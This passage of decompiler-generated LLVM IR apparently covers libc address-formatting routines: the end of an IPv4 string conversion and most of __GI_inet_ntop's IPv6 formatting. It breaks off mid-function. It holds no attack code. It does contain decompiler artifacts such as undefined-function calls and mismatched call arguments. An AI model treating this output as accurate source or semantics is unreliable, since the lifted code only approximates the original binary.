dec_label_pc_8066ac1:                             ; preds = %dec_label_pc_8066a68
  store i32 %v0_8066a89, i32* @esi, align 4
  %div12 = udiv i8 %v2_8066a73, 10
  %tmp32 = urem i8 %div12, 10
  %tmp33 = zext i8 %tmp32 to i32
  store i32 %tmp33, i32* %edx.global-to-local, align 4
  %v1_8066adc = add i32 %v0_8066a87, 2
  store i32 %v1_8066adc, i32* %ecx.global-to-local, align 4
  %v2_8066ae1 = or i8 %tmp32, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8066ae1 = zext i8 %v2_8066ae1 to i32
  store i32 %v12_8066ae1, i32* %eax.global-to-local, align 4
  %v4_8066ae3 = add i32 %v0_8066a89, 43
  %v5_8066ae3 = add i32 %v4_8066ae3, %v0_8066a8d
  %v6_8066ae3 = inttoptr i32 %v5_8066ae3 to i8*
  store i8 %v2_8066ae1, i8* %v6_8066ae3, align 1
  br label %dec_label_pc_8066ae7

dec_label_pc_8066ae7:                             ; preds = %dec_label_pc_8066a94, %dec_label_pc_8066abb, %dec_label_pc_8066ac1
  %v0_8066ae7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8066ae7 = inttoptr i32 %v0_8066ae7 to i8*
  %v2_8066ae7 = load i8, i8* %v1_8066ae7, align 1
  %v3_8066ae7 = zext i8 %v2_8066ae7 to i32
  store i32 %v3_8066ae7, i32* %eax.global-to-local, align 4
  %v0_8066af0 = load i32, i32* @edi, align 4
  %v1_8066af0 = add i32 %v0_8066af0, 1
  store i32 %v1_8066af0, i32* @edi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8066af5 = load i32, i32* @esp, align 4
  %v1_8066af5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8066af5 = add i32 %v0_8066af5, 44
  %v3_8066af5 = add i32 %v2_8066af5, %v1_8066af5
  %v4_8066af5 = inttoptr i32 %v3_8066af5 to i8*
  store i8 46, i8* %v4_8066af5, align 1
  %v0_8066afa = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066afa = load i32, i32* %eax.global-to-local, align 4
  %v2_8066afa = zext i32 %v1_8066afa to i64
  %v3_8066afa = load i32, i32* %edx.global-to-local, align 4
  %v4_8066afa = zext i32 %v3_8066afa to i64
  %v5_8066afa = mul nuw i64 %v4_8066afa, 4294967296
  %v6_8066afa = or i64 %v5_8066afa, %v2_8066afa
  %v7_8066afa = zext i32 %v0_8066afa to i64
  %v8_8066afa = udiv i64 %v6_8066afa, %v7_8066afa
  %v9_8066afa = trunc i64 %v8_8066afa to i32
  %v10_8066afa = urem i64 %v6_8066afa, %v7_8066afa
  %v11_8066afa = trunc i64 %v10_8066afa to i32
  store i32 %v11_8066afa, i32* %edx.global-to-local, align 4
  %v0_8066afc = load i32, i32* %ecx.global-to-local, align 4
  %v1_8066afc = add i32 %v0_8066afc, 2
  store i32 %v1_8066afc, i32* %ebx.global-to-local, align 4
  %v3_8066aff = and i32 %v9_8066afa, -256
  %v1_8066b01 = trunc i64 %v10_8066afa to i8
  %v2_8066b01 = add i8 %v1_8066b01, 48
  %v12_8066b01 = zext i8 %v2_8066b01 to i32
  %v15_8066b01 = or i32 %v12_8066b01, %v3_8066aff
  store i32 %v15_8066b01, i32* %eax.global-to-local, align 4
  %v2_8066b03 = load i32, i32* @esp, align 4
  %v4_8066b03 = add i32 %v0_8066afc, 43
  %v5_8066b03 = add i32 %v4_8066b03, %v2_8066b03
  %v6_8066b03 = inttoptr i32 %v5_8066b03 to i8*
  store i8 %v2_8066b01, i8* %v6_8066b03, align 1
  %v0_8066b07.pre = load i32, i32* @edi, align 4
  %v10_8066b07 = icmp eq i32 %v0_8066b07.pre, 3
  store i1 %v10_8066b07, i1* %zf.global-to-local, align 1
  %v7_8066b0a = icmp sgt i32 %v0_8066b07.pre, 3
  br i1 %v7_8066b0a, label %dec_label_pc_8066b10, label %dec_label_pc_8066ae7.dec_label_pc_8066a68_crit_edge

dec_label_pc_8066ae7.dec_label_pc_8066a68_crit_edge: ; preds = %dec_label_pc_8066ae7
  %v0_8066a6c.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8066a6e.pre = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066a83.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8066a68

dec_label_pc_8066b10:                             ; preds = %dec_label_pc_8066ae7
  %v0_8066b10 = load i32, i32* @esp, align 4
  %v1_8066b10 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066b10 = add i32 %v0_8066b10, 42
  %v3_8066b10 = add i32 %v2_8066b10, %v1_8066b10
  %v4_8066b10 = inttoptr i32 %v3_8066b10 to i8*
  store i8 0, i8* %v4_8066b10, align 1
  %v0_8066b15 = load i32, i32* @esp, align 4
  %v9_8066b15 = icmp eq i32 %v0_8066b15, 12
  store i1 %v9_8066b15, i1* %zf.global-to-local, align 1
  %v2_8066b18 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8066b18, i32* %ebx.global-to-local, align 4
  %tmp34 = bitcast i32* %stack_var_-33 to i8*
  %v3_8066b1d = call i32 @strlen(i8* %tmp34)
  store i32 %v3_8066b1d, i32* @eax, align 4
  %v15_8066b25 = icmp eq i32 %v3_8066b1d, %v0_8066a5a
  store i1 %v15_8066b25, i1* %zf.global-to-local, align 1
  %tmp = icmp ugt i32 %v3_8066b1d, %v0_8066a5a
  br i1 %tmp, label %dec_label_pc_8066b2b, label %dec_label_pc_8066b3b

dec_label_pc_8066b2b:                             ; preds = %dec_label_pc_8066b10
  store i32 28, i32* inttoptr (i32 -8 to i32*), align 8
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8066b4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8066b4a

dec_label_pc_8066b3b:                             ; preds = %dec_label_pc_8066b10
  %tmp35 = bitcast i8** %stack_var_-56 to i32*
  %v3_8066b3e4 = load i32, i32* %tmp35, align 4
  %v0_8066b42.cast = inttoptr i32 %v3_8066b3e4 to i8*
  %v4_8066b42 = call i32 @strcpy(i8* %v0_8066b42.cast, i32 %v2_8066b18)
  store i32 %v4_8066b42, i32* %eax.global-to-local, align 4
  %v0_8066b47 = load i32, i32* @esp, align 4
  %v6_8066b47 = icmp eq i32 %v0_8066b47, -16
  store i1 %v6_8066b47, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8066b4a

dec_label_pc_8066b4a:                             ; preds = %dec_label_pc_8066b2b, %dec_label_pc_8066b3b
  %v0_8066b51 = phi i32 [ 0, %dec_label_pc_8066b2b ], [ %v4_8066b42, %dec_label_pc_8066b3b ]
  %v0_8066b4a = phi i32 [ %v0_8066b4a.pre, %dec_label_pc_8066b2b ], [ %v15_8066a4f, %dec_label_pc_8066b3b ]
  %v9_8066b4a = icmp eq i32 %v0_8066b4a, -60
  store i1 %v9_8066b4a, i1* %zf.global-to-local, align 1
  %v2_8066b4d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8066b4d, i32* %ebx.global-to-local, align 4
  store i32 %v0_8066a4b, i32* @esi, align 4
  store i32 %v0_8066a48, i32* @edi, align 4
  ret i32 %v0_8066b51

; uselistorder directives
  uselistorder i32 %v0_8066b07.pre, { 1, 0, 2 }
  uselistorder i8 %v2_8066ae1, { 1, 0 }
  uselistorder i8 %tmp30, { 1, 0, 2 }
  uselistorder i1 %v11_8066a8d, { 1, 0 }
  uselistorder i32 %v0_8066a89, { 0, 2, 1 }
  uselistorder i8 %v2_8066a73, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_8066a6e, { 1, 0 }
  uselistorder i32 %v15_8066a4f, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32* %ecx.global-to-local, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i8 48, { 13, 9, 10, 0, 11, 14, 15, 1, 12, 2, 3, 5, 6, 4, 7, 8 }
  uselistorder i8 100, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8066b4a, { 1, 0 }
  uselistorder label %dec_label_pc_8066ae7, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8066b53 = load i32, i32* @edi, align 4
  %v0_8066b54 = load i32, i32* @esi, align 4
  %v0_8066b55 = load i32, i32* @ebx, align 4
  store i32 %v0_8066b55, i32* %stack_var_-16, align 4
  %v4_8066b55 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8066b5d = icmp eq i32 %arg1, 2
  br i1 %v9_8066b5d, label %dec_label_pc_8066b6d, label %dec_label_pc_8066b62

dec_label_pc_8066b62:                             ; preds = %entry
  %v9_8066b62 = icmp eq i32 %arg1, 10
  %v1_8066b65 = icmp eq i1 %v9_8066b62, false
  br i1 %v1_8066b65, label %dec_label_pc_8066d12, label %dec_label_pc_8066b85

dec_label_pc_8066b6d:                             ; preds = %entry
  %v4_8066b6d = ptrtoint i8* %arg3 to i32
  store i32 %v4_8066b6d, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8066b79 = call i32 @inet_ntop4(i32 %v0_8066b55, i32 %v0_8066b54, i32 %v0_8066b53)
  store i32 %v3_8066b79, i32* %eax.global-to-local, align 4
  store i32 %v3_8066b79, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8066d14

dec_label_pc_8066b85:                             ; preds = %dec_label_pc_8066b62
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 8, i32* %ecx.global-to-local, align 4
  %tmp44 = bitcast i32* %stack_var_-48 to i8*
  %v5_8066b90 = call i8* @_memset(i8* %tmp44, i32 0, i32 8)
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8066baa = add i32 %arg2, 1
  br label %dec_label_pc_8066b94

dec_label_pc_8066b94:                             ; preds = %dec_label_pc_8066b94.dec_label_pc_8066b94_crit_edge, %dec_label_pc_8066b85
  %v0_8066baf = phi i32 [ %v0_8066b94.pre, %dec_label_pc_8066b94.dec_label_pc_8066b94_crit_edge ], [ 0, %dec_label_pc_8066b85 ]
  %v1_8066b9d = ashr i32 %v0_8066baf, 31
  %v2_8066b9e = zext i32 %v0_8066baf to i64
  %v4_8066b9e = zext i32 %v1_8066b9d to i64
  %v5_8066b9e = mul nuw i64 %v4_8066b9e, 4294967296
  %v6_8066b9e = or i64 %v5_8066b9e, %v2_8066b9e
  %v8_8066b9e = sdiv i64 %v6_8066b9e, 2
  %v9_8066b9e = trunc i64 %v8_8066b9e to i32
  store i32 %v9_8066b9e, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8066ba6 = add i32 %v0_8066baf, %arg2
  %v3_8066ba6 = inttoptr i32 %v2_8066ba6 to i8*
  %v4_8066ba6 = load i8, i8* %v3_8066ba6, align 1
  %v5_8066ba6 = zext i8 %v4_8066ba6 to i32
  store i32 %v5_8066ba6, i32* %eax.global-to-local, align 4
  %v3_8066baa = add i32 %v2_8066baa, %v0_8066baf
  %v4_8066baa = inttoptr i32 %v3_8066baa to i8*
  %v5_8066baa = load i8, i8* %v4_8066baa, align 1
  %v6_8066baa = zext i8 %v5_8066baa to i32
  store i32 %v6_8066baa, i32* %edx.global-to-local, align 4
  %v1_8066baf = add i32 %v0_8066baf, 2
  store i32 %v1_8066baf, i32* %ecx.global-to-local, align 4
  %v2_8066bb2 = mul nuw nsw i32 %v5_8066ba6, 256
  %v2_8066bb5 = or i32 %v6_8066baa, %v2_8066bb2
  store i32 %v2_8066bb5, i32* %eax.global-to-local, align 4
  %v1_8066bba = load i32, i32* @esp, align 4
  %v3_8066bba = mul i32 %v9_8066b9e, 4
  %v4_8066bba = add i32 %v3_8066bba, 60
  %v5_8066bba = add i32 %v4_8066bba, %v1_8066bba
  %v6_8066bba = inttoptr i32 %v5_8066bba to i32*
  store i32 %v2_8066bb5, i32* %v6_8066bba, align 4
  %v7_8066bbe = icmp sgt i32 %v1_8066baf, 15
  br i1 %v7_8066bbe, label %dec_label_pc_8066bc0, label %dec_label_pc_8066b94.dec_label_pc_8066b94_crit_edge

dec_label_pc_8066b94.dec_label_pc_8066b94_crit_edge: ; preds = %dec_label_pc_8066b94
  %v0_8066b94.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8066b94

dec_label_pc_8066bc0:                             ; preds = %dec_label_pc_8066b94
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @esi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8066bca.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8066bca

dec_label_pc_8066bca:                             ; preds = %dec_label_pc_8066bc0, %dec_label_pc_8066bf7
  %v0_8066bf764 = phi i32 [ 0, %dec_label_pc_8066bc0 ], [ %v1_8066bf7, %dec_label_pc_8066bf7 ]
  %v0_8066be263 = phi i32 [ -1, %dec_label_pc_8066bc0 ], [ %v0_8066be27, %dec_label_pc_8066bf7 ]
  %v0_8066c0262 = phi i32 [ -1, %dec_label_pc_8066bc0 ], [ %v0_8066be78, %dec_label_pc_8066bf7 ]
  %v0_8066c0d61 = phi i32 [ -1, %dec_label_pc_8066bc0 ], [ %v0_8066bf212, %dec_label_pc_8066bf7 ]
  %v2_8066bca = mul nuw nsw i32 %v0_8066bf764, 4
  %v3_8066bca = add nuw nsw i32 %v2_8066bca, 60
  %v4_8066bca = add i32 %v3_8066bca, %v0_8066bca.pre
  %v5_8066bca = inttoptr i32 %v4_8066bca to i32*
  %v6_8066bca = load i32, i32* %v5_8066bca, align 4
  %v7_8066bca = icmp eq i32 %v6_8066bca, 0
  %v1_8066bcf = icmp eq i1 %v7_8066bca, false
  %v10_8066be2 = icmp eq i32 %v0_8066be263, -1
  br i1 %v1_8066bcf, label %dec_label_pc_8066be2, label %dec_label_pc_8066bd1

dec_label_pc_8066bd1:                             ; preds = %dec_label_pc_8066bca
  %v1_8066bd4 = icmp eq i1 %v10_8066be2, false
  br i1 %v1_8066bd4, label %dec_label_pc_8066bdf, label %dec_label_pc_8066bd6

dec_label_pc_8066bd6:                             ; preds = %dec_label_pc_8066bd1
  store i32 %v0_8066bf764, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8066bf7

dec_label_pc_8066bdf:                             ; preds = %dec_label_pc_8066bd1
  %v0_8066bdf = load i32, i32* %ecx.global-to-local, align 4
  %v1_8066bdf = add i32 %v0_8066bdf, 1
  store i32 %v1_8066bdf, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8066bf7

dec_label_pc_8066be2:                             ; preds = %dec_label_pc_8066bca
  br i1 %v10_8066be2, label %dec_label_pc_8066bf7, label %dec_label_pc_8066be7

dec_label_pc_8066be7:                             ; preds = %dec_label_pc_8066be2
  %v10_8066be7 = icmp eq i32 %v0_8066c0262, -1
  %v0_8066bf0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8066bec = load i32, i32* @ebp, align 4
  %v7_8066bee = icmp sgt i32 %v0_8066bf0.pre, %v1_8066bec
  %or.cond = or i1 %v10_8066be7, %v7_8066bee
  br i1 %or.cond, label %dec_label_pc_8066bf0, label %dec_label_pc_8066bf4

dec_label_pc_8066bf0:                             ; preds = %dec_label_pc_8066be7
  store i32 %v0_8066bf0.pre, i32* @ebp, align 4
  store i32 %v0_8066c0d61, i32* @esi, align 4
  br label %dec_label_pc_8066bf4

dec_label_pc_8066bf4:                             ; preds = %dec_label_pc_8066be7, %dec_label_pc_8066bf0
  %v0_8066be710 = phi i32 [ %v0_8066c0d61, %dec_label_pc_8066bf0 ], [ %v0_8066c0262, %dec_label_pc_8066be7 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066bf7

dec_label_pc_8066bf7:                             ; preds = %dec_label_pc_8066be2, %dec_label_pc_8066bdf, %dec_label_pc_8066bd6, %dec_label_pc_8066bf4
  %v0_8066bf212 = phi i32 [ %v0_8066c0d61, %dec_label_pc_8066be2 ], [ %v0_8066c0d61, %dec_label_pc_8066bdf ], [ %v0_8066bf764, %dec_label_pc_8066bd6 ], [ -1, %dec_label_pc_8066bf4 ]
  %v0_8066be27 = phi i32 [ -1, %dec_label_pc_8066be2 ], [ %v0_8066be263, %dec_label_pc_8066bdf ], [ %v0_8066bf764, %dec_label_pc_8066bd6 ], [ -1, %dec_label_pc_8066bf4 ]
  %v0_8066be78 = phi i32 [ %v0_8066c0262, %dec_label_pc_8066be2 ], [ %v0_8066c0262, %dec_label_pc_8066bdf ], [ %v0_8066c0262, %dec_label_pc_8066bd6 ], [ %v0_8066be710, %dec_label_pc_8066bf4 ]
  %v1_8066bf7 = add nuw nsw i32 %v0_8066bf764, 1
  store i32 %v1_8066bf7, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8066bf7, 8
  br i1 %exitcond, label %dec_label_pc_8066bfd, label %dec_label_pc_8066bca

dec_label_pc_8066bfd:                             ; preds = %dec_label_pc_8066bf7
  %v10_8066bfd = icmp eq i32 %v0_8066bf212, -1
  br i1 %v10_8066bfd, label %dec_label_pc_8066bfd.dec_label_pc_8066c0f_crit_edge, label %dec_label_pc_8066c02

dec_label_pc_8066bfd.dec_label_pc_8066c0f_crit_edge: ; preds = %dec_label_pc_8066bfd
  %v1_8066c1f.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8066c0f

dec_label_pc_8066c02:                             ; preds = %dec_label_pc_8066bfd
  %v10_8066c02 = icmp eq i32 %v0_8066be78, -1
  %v0_8066c0b.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v10_8066c02, label %dec_label_pc_8066c0b, label %dec_label_pc_8066c07

dec_label_pc_8066c07:                             ; preds = %dec_label_pc_8066c02
  %v1_8066c07 = load i32, i32* @ebp, align 4
  %v7_8066c09 = icmp sgt i32 %v0_8066c0b.pre, %v1_8066c07
  br i1 %v7_8066c09, label %dec_label_pc_8066c0b, label %dec_label_pc_8066c0f

dec_label_pc_8066c0b:                             ; preds = %dec_label_pc_8066c02, %dec_label_pc_8066c07
  store i32 %v0_8066c0b.pre, i32* @ebp, align 4
  store i32 %v0_8066bf212, i32* @esi, align 4
  br label %dec_label_pc_8066c0f

dec_label_pc_8066c0f:                             ; preds = %dec_label_pc_8066bfd.dec_label_pc_8066c0f_crit_edge, %dec_label_pc_8066c07, %dec_label_pc_8066c0b
  %v1_8066c1f.pre = phi i32 [ %v1_8066c07, %dec_label_pc_8066c07 ], [ %v1_8066c1f.pre.pre, %dec_label_pc_8066bfd.dec_label_pc_8066c0f_crit_edge ], [ %v0_8066c0b.pre, %dec_label_pc_8066c0b ]
  %v5_8066c1c = phi i32 [ %v0_8066be78, %dec_label_pc_8066c07 ], [ %v0_8066be78, %dec_label_pc_8066bfd.dec_label_pc_8066c0f_crit_edge ], [ %v0_8066bf212, %dec_label_pc_8066c0b ]
  %v10_8066c0f = icmp eq i32 %v5_8066c1c, -1
  br i1 %v10_8066c0f, label %dec_label_pc_8066c1f, label %dec_label_pc_8066c14

dec_label_pc_8066c14:                             ; preds = %dec_label_pc_8066c0f
  %v1_8066c14 = add i32 %v1_8066c1f.pre, -1
  %v6_8066c14 = sub i32 0, %v1_8066c1f.pre
  %v7_8066c14 = and i32 %v1_8066c1f.pre, %v6_8066c14
  %v8_8066c14 = icmp slt i32 %v7_8066c14, 0
  %v9_8066c14 = icmp eq i32 %v1_8066c14, 0
  %v10_8066c14 = icmp slt i32 %v1_8066c14, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_8066c1c = icmp ne i1 %v10_8066c14, %v8_8066c14
  %v4_8066c1c = or i1 %v9_8066c14, %v3_8066c1c
  %v7_8066c1c = select i1 %v4_8066c1c, i32 -1, i32 %v5_8066c1c
  store i32 %v7_8066c1c, i32* @esi, align 4
  br label %dec_label_pc_8066c1f

dec_label_pc_8066c1f:                             ; preds = %dec_label_pc_8066c0f, %dec_label_pc_8066c14
  %v0_8066c1f = phi i32 [ %v7_8066c1c, %dec_label_pc_8066c14 ], [ %v5_8066c1c, %dec_label_pc_8066c0f ]
  %v2_8066c1f = add i32 %v0_8066c1f, %v1_8066c1f.pre
  store i32 %v2_8066c1f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v2_8066c24 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8066c24, i32* @edi, align 4
  %v12_8066c65 = icmp eq i32 %tmp, 65535
  %v10_8066cbf55 = icmp eq i32 %v0_8066c1f, -1
  %v1_8066c6d = icmp eq i1 %v12_8066c65, false
  br label %dec_label_pc_8066c31

dec_label_pc_8066c31:                             ; preds = %dec_label_pc_8066c1f, %dec_label_pc_8066cb5
  %v10_8066cbf60 = phi i1 [ %v10_8066cbf55, %dec_label_pc_8066c1f ], [ %v10_8066cbf, %dec_label_pc_8066cb5 ]
  %v0_8066c4a59 = phi i32 [ 0, %dec_label_pc_8066c1f ], [ %v1_8066cb5, %dec_label_pc_8066cb5 ]
  %v1_8066c4058 = phi i32 [ %v0_8066c1f, %dec_label_pc_8066c1f ], [ %v0_8066cbf.pre, %dec_label_pc_8066cb5 ]
  %v0_8066c4e57 = phi i32 [ %v2_8066c24, %dec_label_pc_8066c1f ], [ %v0_8066c4419, %dec_label_pc_8066cb5 ]
  br i1 %v10_8066cbf60, label %dec_label_pc_8066c4a, label %dec_label_pc_8066c36

dec_label_pc_8066c36:                             ; preds = %dec_label_pc_8066c31
  %v12_8066c36 = icmp eq i32 %v0_8066c4a59, %v1_8066c4058
  %v5_8066c38 = icmp slt i32 %v0_8066c4a59, %v1_8066c4058
  br i1 %v5_8066c38, label %dec_label_pc_8066c4a, label %dec_label_pc_8066c3a

dec_label_pc_8066c3a:                             ; preds = %dec_label_pc_8066c36
  %v5_8066c3e = icmp slt i32 %v0_8066c4a59, %v2_8066c1f
  br i1 %v5_8066c3e, label %dec_label_pc_8066c40, label %dec_label_pc_8066c4a

dec_label_pc_8066c40:                             ; preds = %dec_label_pc_8066c3a
  %v1_8066c42 = icmp eq i1 %v12_8066c36, false
  br i1 %v1_8066c42, label %dec_label_pc_8066cb5, label %dec_label_pc_8066c44

dec_label_pc_8066c44:                             ; preds = %dec_label_pc_8066c40
  %v1_8066c44 = inttoptr i32 %v0_8066c4e57 to i8*
  store i8 58, i8* %v1_8066c44, align 1
  %v0_8066c47 = load i32, i32* @edi, align 4
  %v1_8066c47 = add i32 %v0_8066c47, 1
  store i32 %v1_8066c47, i32* @edi, align 4
  br label %dec_label_pc_8066cb5

dec_label_pc_8066c4a:                             ; preds = %dec_label_pc_8066c3a, %dec_label_pc_8066c36, %dec_label_pc_8066c31
  %v1_8066c4a = icmp eq i32 %v0_8066c4a59, 0
  br i1 %v1_8066c4a, label %dec_label_pc_8066ca0, label %dec_label_pc_8066c4e

dec_label_pc_8066c4e:                             ; preds = %dec_label_pc_8066c4a
  %v1_8066c4e = inttoptr i32 %v0_8066c4e57 to i8*
  store i8 58, i8* %v1_8066c4e, align 1
  %v0_8066c51 = load i32, i32* @edi, align 4
  %v1_8066c51 = add i32 %v0_8066c51, 1
  store i32 %v1_8066c51, i32* @edi, align 4
  %v0_8066c52 = load i32, i32* @ebx, align 4
  %v9_8066c52 = icmp eq i32 %v0_8066c52, 6
  %v1_8066c55 = icmp eq i1 %v9_8066c52, false
  br i1 %v1_8066c55, label %dec_label_pc_8066ca0, label %dec_label_pc_8066c57

dec_label_pc_8066c57:                             ; preds = %dec_label_pc_8066c4e
  %v0_8066c57 = load i32, i32* @esi, align 4
  %v1_8066c57 = icmp eq i32 %v0_8066c57, 0
  %v1_8066c59 = icmp eq i1 %v1_8066c57, false
  br i1 %v1_8066c59, label %dec_label_pc_8066ca0, label %dec_label_pc_8066c5b

dec_label_pc_8066c5b:                             ; preds = %dec_label_pc_8066c57
  %v0_8066c5b = load i32, i32* @ebp, align 4
  %v9_8066c5b = icmp eq i32 %v0_8066c5b, 6
  br i1 %v9_8066c5b, label %dec_label_pc_8066c6f, label %dec_label_pc_8066c60

dec_label_pc_8066c60:                             ; preds = %dec_label_pc_8066c5b
  %v9_8066c60 = icmp eq i32 %v0_8066c5b, 5
  %v1_8066c63 = icmp eq i1 %v9_8066c60, false
  br i1 %v1_8066c63, label %dec_label_pc_8066ca0, label %dec_label_pc_8066c65

dec_label_pc_8066c65:                             ; preds = %dec_label_pc_8066c60
  br i1 %v1_8066c6d, label %dec_label_pc_8066ca0, label %dec_label_pc_8066c6f

dec_label_pc_8066c6f:                             ; preds = %dec_label_pc_8066c65, %dec_label_pc_8066c5b
  store i32 %v1_8066c51, i32* @edx, align 4
  %v1_8066c51.neg = sub i32 -1, %v0_8066c51
  %v2_8066c79 = add i32 %v4_8066b55, -32
  %v1_8066c7b = add i32 %v2_8066c79, %v1_8066c51.neg
  store i32 %v1_8066c7b, i32* @ecx, align 4
  %v1_8066c7e = add i32 %arg2, 12
  store i32 %v1_8066c7e, i32* @eax, align 4
  %v3_8066c81 = call i32 @inet_ntop4(i32 %v2_8066c1f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8066c81, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8066c88 = icmp eq i32 %v3_8066c81, 0
  br i1 %v1_8066c88, label %dec_label_pc_8066d14, label %dec_label_pc_8066c90

dec_label_pc_8066c90:                             ; preds = %dec_label_pc_8066c6f
  %v0_8066c93 = load i32, i32* @edi, align 4
  %v5_8066c93 = inttoptr i32 %v0_8066c93 to i8*
  %v3_8066c94 = call i32 @strlen(i8* %v5_8066c93)
  store i32 %v3_8066c94, i32* %eax.global-to-local, align 4
  %v0_8066c9c = load i32, i32* @edi, align 4
  %v3_8066c9c = add i32 %v0_8066c9c, %v3_8066c94
  store i32 %v3_8066c9c, i32* @edi, align 4
  %v0_8066cc4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8066cc4

dec_label_pc_8066ca0:                             ; preds = %dec_label_pc_8066c65, %dec_label_pc_8066c60, %dec_label_pc_8066c57, %dec_label_pc_8066c4e, %dec_label_pc_8066c4a
  %v0_8066caa = phi i32 [ %v1_8066c51, %dec_label_pc_8066c65 ], [ %v1_8066c51, %dec_label_pc_8066c60 ], [ %v1_8066c51, %dec_label_pc_8066c57 ], [ %v1_8066c51, %dec_label_pc_8066c4e ], [ %v0_8066c4e57, %dec_label_pc_8066c4a ]
  %v4_8066cab = call i32 @sprintf(i32 %v0_8066caa, i32 ptrtoint ([3 x i8]* @global_var_80703c9.1713 to i32))
  store i32 %v4_8066cab, i32* %eax.global-to-local, align 4
  %v0_8066cb3 = load i32, i32* @edi, align 4
  %v2_8066cb3 = add i32 %v0_8066cb3, %v4_8066cab
  store i32 %v2_8066cb3, i32* @edi, align 4
  br label %dec_label_pc_8066cb5

dec_label_pc_8066cb5:                             ; preds = %dec_label_pc_8066c40, %dec_label_pc_8066c44, %dec_label_pc_8066ca0
  %v0_8066c4419 = phi i32 [ %v0_8066c4e57, %dec_label_pc_8066c40 ], [ %v1_8066c47, %dec_label_pc_8066c44 ], [ %v2_8066cb3, %dec_label_pc_8066ca0 ]
  %v0_8066cb5 = load i32, i32* @ebx, align 4
  %v1_8066cb5 = add i32 %v0_8066cb5, 1
  store i32 %v1_8066cb5, i32* @ebx, align 4
  %v0_8066cbf.pre = load i32, i32* @esi, align 4
  %v7_8066cb9 = icmp sgt i32 %v1_8066cb5, 7
  %v10_8066cbf = icmp eq i32 %v0_8066cbf.pre, -1
  br i1 %v7_8066cb9, label %dec_label_pc_8066cbf, label %dec_label_pc_8066c31

dec_label_pc_8066cbf:                             ; preds = %dec_label_pc_8066cb5
  br i1 %v10_8066cbf, label %dec_label_pc_8066cd0, label %dec_label_pc_8066cc4

dec_label_pc_8066cc4:                             ; preds = %dec_label_pc_8066cbf, %dec_label_pc_8066c90
  %v0_8066ccc = phi i32 [ %v0_8066c4419, %dec_label_pc_8066cbf ], [ %v3_8066c9c, %dec_label_pc_8066c90 ]
  %v0_8066cc4 = phi i32 [ %v0_8066cbf.pre, %dec_label_pc_8066cbf ], [ %v0_8066cc4.pre, %dec_label_pc_8066c90 ]
  %v1_8066cc4 = load i32, i32* @ebp, align 4
  %v2_8066cc4 = add i32 %v1_8066cc4, %v0_8066cc4
  store i32 %v2_8066cc4, i32* %eax.global-to-local, align 4
  %v9_8066cc7 = icmp eq i32 %v2_8066cc4, 8
  %v1_8066cca = icmp eq i1 %v9_8066cc7, false
  br i1 %v1_8066cca, label %dec_label_pc_8066cd0, label %dec_label_pc_8066ccc

dec_label_pc_8066ccc:                             ; preds = %dec_label_pc_8066cc4
  %v1_8066ccc = inttoptr i32 %v0_8066ccc to i8*
  store i8 58, i8* %v1_8066ccc, align 1
